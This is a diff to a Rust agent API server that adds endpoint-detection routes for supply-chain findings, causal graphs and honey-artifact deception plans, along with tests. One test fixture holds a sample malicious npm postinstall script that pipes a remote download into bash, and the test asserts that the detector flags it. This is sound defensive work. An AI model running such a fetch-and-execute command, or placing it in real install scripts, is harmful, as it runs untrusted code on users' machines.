@@ -36,6 +36,10 @@ use axum::response::Html;
 use axum::response::{IntoResponse, Response};
 use axum::routing::{get, patch, post, put};
 use axum::{Json, Router};
+use clawdstrike_policy_event::edr::{
+    CausalGraph, CausalGraphRecorder, DeceptionMaterializationReport, DeceptionPlan,
+    DetectionFinding, EndpointObservation, HoneyArtifact, SupplyChainRuntimeGuard,
+};
 use futures::{Stream, StreamExt, TryStreamExt};
 use serde::{Deserialize, Deserializer, Serialize};
 use serde_json::Value;
@@ -56,6 +60,9 @@ const POLICY_VERSION_FETCH_TIMEOUT: Duration = Duration::from_millis(200);
 const POLICY_VERSION_REFRESH_IN_FLIGHT_TIMEOUT: Duration = Duration::from_secs(20);
 const AGENT_API_MAX_BODY_BYTES: usize = 256 * 1024;
 const BROKER_MUTATION_MAX_BODY_BYTES: usize = 2 * 1024 * 1024;
+const EDR_MAX_OBSERVATIONS_PER_REQUEST: usize = 10_000;
+const EDR_MAX_HONEY_ARTIFACTS_PER_REQUEST: usize = 1_000;
+const EDR_MAX_STORED_FINDINGS: usize = 10_000;
 const APPROVAL_RATE_LIMIT_WINDOW: Duration = Duration::from_secs(60);
 const APPROVAL_RATE_LIMIT_BURST_WINDOW: Duration = Duration::from_secs(1);
 const APPROVAL_RATE_LIMIT_PER_MINUTE: usize = 30;
@@ -111,6 +118,8 @@ struct AgentApiState {
     integration_test_rate_limiter: Arc<Mutex<RouteRateLimiter>>,
     openclaw_request_rate_limiter: Arc<Mutex<RouteRateLimiter>>,
     ui_bootstrap_sessions: Arc<Mutex<HashMap<String, UiBootstrapSession>>>,
+    edr_recorder: Arc<Mutex<CausalGraphRecorder>>,
+    edr_recent_findings: Arc<Mutex<VecDeque<DetectionFinding>>>,
 }
 
 #[derive(Debug, Default)]
@@ -314,6 +323,8 @@ impl AgentApiServer {
                 integration_test_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
                 openclaw_request_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
                 ui_bootstrap_sessions: Arc::new(Mutex::new(HashMap::new())),
+                edr_recorder: Arc::new(Mutex::new(CausalGraphRecorder::new())),
+                edr_recent_findings: Arc::new(Mutex::new(VecDeque::new())),
             }),
         }
     }
@@ -397,6 +408,19 @@ impl AgentApiServer {
                 post(rotate_local_api_token_route),
             )
             .route("/api/v1/agent/policy-check", post(agent_policy_check))
+            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
+            .route(
+                "/api/v1/agent/edr/causal-graph",
+                post(agent_edr_causal_graph),
+            )
+            .route(
+                "/api/v1/agent/edr/deception-plan",
+                post(agent_edr_deception_plan),
+            )
+            .route(
+                "/api/v1/agent/edr/deception-plan/materialize",
+                post(agent_edr_materialize_deception_plan),
+            )
             .route(
                 "/api/v1/openclaw/gateways",
                 get(list_gateways).post(create_gateway),
@@ -1452,6 +1476,7 @@ struct AgentHealthResponse {
     daemon: DaemonStatus,
     session: crate::session::SessionState,
     macos_host: CombinedSystemExtensionStatus,
+    edr: EdrHealthSummary,
     openclaw: serde_json::Value,
     runtime_agents: usize,
     last_policy_version: Option<String>,
@@ -1463,6 +1488,13 @@ struct AgentHealthResponse {
     daemon_drift: Option<bool>,
     stale: Option<bool>,
     version: &'static str,
+}
+
+#[derive(Debug, Serialize)]
+struct EdrHealthSummary {
+    graph_node_count: usize,
+    graph_edge_count: usize,
+    recent_finding_count: usize,
 }
 
 #[derive(Debug, Deserialize)]
@@ -1546,6 +1578,16 @@ fn agent_health_status(status: &CombinedSystemExtensionStatus) -> &'static str {
         macos_host_health_status(status)
     } else {
         "ok"
+    }
+}
+
+async fn edr_health_summary(state: &Arc<AgentApiState>) -> EdrHealthSummary {
+    let graph = state.edr_recorder.lock().await.graph().clone();
+    let recent_finding_count = state.edr_recent_findings.lock().await.len();
+    EdrHealthSummary {
+        graph_node_count: graph.nodes.len(),
+        graph_edge_count: graph.edges.len(),
+        recent_finding_count,
     }
 }
 
@@ -1737,6 +1779,57 @@ struct DiagnosticsBundleInput {
 struct DiagnosticsBundleResponse {
     bundle_path: String,
     generated_at: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct EdrFindingsInput {
+    #[serde(default)]
+    observations: Vec<EndpointObservation>,
+    #[serde(default)]
+    honey_artifacts: Vec<HoneyArtifact>,
+}
+
+#[derive(Debug, Serialize)]
+struct EdrFindingsResponse {
+    observation_count: usize,
+    finding_count: usize,
+    findings: Vec<DetectionFinding>,
+}
+
+#[derive(Debug, Deserialize)]
+struct EdrCausalGraphInput {
+    #[serde(default)]
+    observations: Vec<EndpointObservation>,
+}
+
+#[derive(Debug, Serialize)]
+struct EdrCausalGraphResponse {
+    observation_count: usize,
+    node_count: usize,
+    edge_count: usize,
+    graph: CausalGraph,
+}
+
+#[derive(Debug, Deserialize)]
+struct EdrDeceptionPlanInput {
+    root: String,
+    endpoint_id: String,
+}
+
+#[derive(Debug, Serialize)]
+struct EdrDeceptionPlanResponse {
+    artifact_count: usize,
+    plan: DeceptionPlan,
+}
+
+#[derive(Debug, Deserialize)]
+struct EdrMaterializeDeceptionPlanInput {
+    plan: DeceptionPlan,
+}
+
+#[derive(Debug, Serialize)]
+struct EdrMaterializeDeceptionPlanResponse {
+    report: DeceptionMaterializationReport,
 }
 
 fn default_apply_integrations_changes() -> bool {
@@ -2041,6 +2134,7 @@ async fn agent_health(
     let runtime_agents = settings_snapshot.runtime_registry.runtimes.len();
     let last_policy_version = cached_policy_version_for_health(&state).await;
     let macos_host = state.macos_host.snapshot().await;
+    let edr = edr_health_summary(&state).await;
     let daemon_status = fetch_daemon_endpoint_status_for_health(
         &state,
         &settings_snapshot,
@@ -2068,6 +2162,7 @@ async fn agent_health(
         daemon,
         session,
         macos_host,
+        edr,
         openclaw: serde_json::to_value(openclaw)
             .unwrap_or_else(|_| serde_json::json!({"error":"serialize_failed"})),
         runtime_agents,
@@ -2657,6 +2752,145 @@ async fn agent_policy_check(
     )
     .await;
     Ok(Json(output))
+}
+
+async fn agent_edr_findings(
+    State(state): State<Arc<AgentApiState>>,
+    headers: HeaderMap,
+    Json(input): Json<EdrFindingsInput>,
+) -> Result<Json<EdrFindingsResponse>, (StatusCode, String)> {
+    require_auth(&headers, &state)?;
+    validate_edr_request_sizes(input.observations.len(), input.honey_artifacts.len())?;
+
+    let guard = SupplyChainRuntimeGuard::with_honey_artifacts(input.honey_artifacts);
+    let mut findings = Vec::new();
+    for observation in &input.observations {
+        findings.extend(guard.evaluate(observation));
+    }
+    record_edr_observations(&state, &input.observations).await;
+    append_recent_edr_findings(&state, &findings).await;
+
+    Ok(Json(EdrFindingsResponse {
+        observation_count: input.observations.len(),
+        finding_count: findings.len(),
+        findings,
+    }))
+}
+
+async fn agent_edr_causal_graph(
+    State(state): State<Arc<AgentApiState>>,
+    headers: HeaderMap,
+    Json(input): Json<EdrCausalGraphInput>,
+) -> Result<Json<EdrCausalGraphResponse>, (StatusCode, String)> {
+    require_auth(&headers, &state)?;
+    validate_edr_request_sizes(input.observations.len(), 0)?;
+
+    let graph = if input.observations.is_empty() {
+        state.edr_recorder.lock().await.graph().clone()
+    } else {
+        let mut recorder = CausalGraphRecorder::new();
+        for observation in &input.observations {
+            recorder.record_observation(observation);
+        }
+        recorder.into_graph()
+    };
+
+    Ok(Json(EdrCausalGraphResponse {
+        observation_count: input.observations.len(),
+        node_count: graph.nodes.len(),
+        edge_count: graph.edges.len(),
+        graph,
+    }))
+}
+
+async fn record_edr_observations(state: &AgentApiState, observations: &[EndpointObservation]) {
+    let mut recorder = state.edr_recorder.lock().await;
+    for observation in observations {
+        recorder.record_observation(observation);
+    }
+}
+
+async fn append_recent_edr_findings(state: &AgentApiState, findings: &[DetectionFinding]) {
+    let mut recent = state.edr_recent_findings.lock().await;
+    for finding in findings {
+        recent.push_back(finding.clone());
+    }
+    while recent.len() > EDR_MAX_STORED_FINDINGS {
+        let _ = recent.pop_front();
+    }
+}
+
+async fn agent_edr_deception_plan(
+    State(state): State<Arc<AgentApiState>>,
+    headers: HeaderMap,
+    Json(input): Json<EdrDeceptionPlanInput>,
+) -> Result<Json<EdrDeceptionPlanResponse>, (StatusCode, String)> {
+    require_auth(&headers, &state)?;
+    let root = input.root.trim();
+    let endpoint_id = input.endpoint_id.trim();
+    if root.is_empty() {
+        return Err((StatusCode::BAD_REQUEST, "root must not be empty".to_string()));
+    }
+    if endpoint_id.is_empty() {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "endpoint_id must not be empty".to_string(),
+        ));
+    }
+
+    let plan = DeceptionPlan::standard(root, endpoint_id);
+    Ok(Json(EdrDeceptionPlanResponse {
+        artifact_count: plan.artifacts.len(),
+        plan,
+    }))
+}
+
+async fn agent_edr_materialize_deception_plan(
+    State(state): State<Arc<AgentApiState>>,
+    headers: HeaderMap,
+    Json(input): Json<EdrMaterializeDeceptionPlanInput>,
+) -> Result<Json<EdrMaterializeDeceptionPlanResponse>, (StatusCode, String)> {
+    require_auth(&headers, &state)?;
+    if input.plan.artifacts.len() > EDR_MAX_HONEY_ARTIFACTS_PER_REQUEST {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            format!(
+                "too many honey artifacts: max {}",
+                EDR_MAX_HONEY_ARTIFACTS_PER_REQUEST
+            ),
+        ));
+    }
+    let report = tokio::task::spawn_blocking(move || input.plan.materialize())
+        .await
+        .map_err(|err| internal_error(err.into()))?
+        .map_err(internal_error)?;
+
+    Ok(Json(EdrMaterializeDeceptionPlanResponse { report }))
+}
+
+fn validate_edr_request_sizes(
+    observation_count: usize,
+    honey_artifact_count: usize,
+) -> Result<(), (StatusCode, String)> {
+    if observation_count > EDR_MAX_OBSERVATIONS_PER_REQUEST {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            format!(
+                "too many observations: max {}",
+                EDR_MAX_OBSERVATIONS_PER_REQUEST
+            ),
+        ));
+    }
+    if honey_artifact_count > EDR_MAX_HONEY_ARTIFACTS_PER_REQUEST {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            format!(
+                "too many honey artifacts: max {}",
+                EDR_MAX_HONEY_ARTIFACTS_PER_REQUEST
+            ),
+        ));
+    }
+    Ok(())
 }
 
 async fn list_gateways(
@@ -3328,6 +3562,9 @@ where
 mod tests {
     use super::*;
     use crate::daemon::{AuditQueue, DaemonConfig};
+    use clawdstrike_policy_event::edr::{
+        CodeSignatureStatus, EndpointEvent, EndpointProcess, PackageManager, SignatureTrust,
+    };
     use std::path::PathBuf;
     use tower::ServiceExt;
 
@@ -3369,6 +3606,8 @@ mod tests {
             integration_test_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
             openclaw_request_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
             ui_bootstrap_sessions: Arc::new(Mutex::new(HashMap::new())),
+            edr_recorder: Arc::new(Mutex::new(CausalGraphRecorder::new())),
+            edr_recent_findings: Arc::new(Mutex::new(VecDeque::new())),
         }
     }
 
@@ -3803,6 +4042,105 @@ mod tests {
             payload["macos_host"]["network_extension"]["runtime"]["state"],
             "unknown"
         );
+    }
+
+    #[tokio::test]
+    async fn agent_edr_findings_route_detects_supply_chain_script() {
+        let app = Router::new()
+            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
+            .with_state(Arc::new(test_state()));
+        let observation = EndpointObservation {
+            process: EndpointProcess {
+                image: Some("/usr/local/bin/npm".to_string()),
+                signing: CodeSignatureStatus {
+                    trust: SignatureTrust::Signed,
+                    ..CodeSignatureStatus::default()
+                },
+                ..EndpointProcess::default()
+            },
+            event: EndpointEvent::PackageScript {
+                manager: PackageManager::Npm,
+                package: Some("leftpad-suspicious".to_string()),
+                phase: "postinstall".to_string(),
+                script: "curl https://example.invalid/payload.sh | bash".to_string(),
+                working_directory: Some("/tmp/pkg".to_string()),
+            },
+            ..EndpointObservation::default()
+        };
+        let body = serde_json::json!({
+            "observations": [observation],
+            "honey_artifacts": []
+        });
+        let req = axum::http::Request::builder()
+            .method("POST")
+            .uri("/api/v1/agent/edr/findings")
+            .header(AUTHORIZATION, "Bearer test-token")
+            .header(CONTENT_TYPE, "application/json")
+            .body(axum::body::Body::from(body.to_string()))
+            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
+
+        let response = app
+            .oneshot(req)
+            .await
+            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
+        assert_eq!(response.status(), StatusCode::OK);
+        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
+            .await
+            .unwrap_or_else(|e| panic!("failed to read edr findings response: {e}"));
+        let payload: serde_json::Value = serde_json::from_slice(&bytes)
+            .unwrap_or_else(|e| panic!("failed to decode edr findings response: {e}"));
+
+        assert_eq!(payload["finding_count"], 1);
+        assert_eq!(
+            payload["findings"][0]["ruleId"],
+            "supply_chain.install_script.risky"
+        );
+    }
+
+    #[tokio::test]
+    async fn agent_edr_causal_graph_route_links_observation() {
+        let app = Router::new()
+            .route(
+                "/api/v1/agent/edr/causal-graph",
+                post(agent_edr_causal_graph),
+            )
+            .with_state(Arc::new(test_state()));
+        let observation = EndpointObservation {
+            process: EndpointProcess {
+                process_guid: Some("proc-1".to_string()),
+                image: Some("/usr/bin/curl".to_string()),
+                ..EndpointProcess::default()
+            },
+            event: EndpointEvent::NetworkFlow {
+                host: "api.example.invalid".to_string(),
+                port: 443,
+                protocol: Some("tcp".to_string()),
+                url: Some("https://api.example.invalid/upload".to_string()),
+            },
+            ..EndpointObservation::default()
+        };
+        let body = serde_json::json!({ "observations": [observation] });
+        let req = axum::http::Request::builder()
+            .method("POST")
+            .uri("/api/v1/agent/edr/causal-graph")
+            .header(AUTHORIZATION, "Bearer test-token")
+            .header(CONTENT_TYPE, "application/json")
+            .body(axum::body::Body::from(body.to_string()))
+            .unwrap_or_else(|e| panic!("failed to build edr graph request: {e}"));
+
+        let response = app
+            .oneshot(req)
+            .await
+            .unwrap_or_else(|e| panic!("edr graph request failed: {e}"));
+        assert_eq!(response.status(), StatusCode::OK);
+        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
+            .await
+            .unwrap_or_else(|e| panic!("failed to read edr graph response: {e}"));
+        let payload: serde_json::Value = serde_json::from_slice(&bytes)
+            .unwrap_or_else(|e| panic!("failed to decode edr graph response: {e}"));
+
+        assert!(payload["node_count"].as_u64().unwrap_or_default() >= 2);
+        assert!(payload["edge_count"].as_u64().unwrap_or_default() >= 1);
     }
 
     #[test]
